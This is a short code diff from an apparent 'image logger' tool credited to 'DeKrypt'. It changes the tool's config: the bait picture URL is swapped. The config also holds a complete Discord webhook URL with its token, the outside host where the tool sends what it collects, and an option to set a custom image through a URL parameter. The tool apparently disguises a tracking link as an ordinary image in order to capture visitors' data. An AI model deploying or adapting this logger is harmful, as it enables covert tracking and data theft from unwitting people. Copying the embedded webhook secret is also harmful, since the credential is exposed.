@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1340410016112443504/xzYfdOVjHFsNd3YWGbdFfjE6wi3Vbg_qmwvEi9H_P7aAlxP28IBMBtaQijKPWKKDCMMu",
-    "image": "https://cdn.wallpapersafari.com/87/27/4qJOvW.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://blog.pincel.app/wp-content/uploads/2023/09/0-add-hidden-text-or-symbol-into-AI-photo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
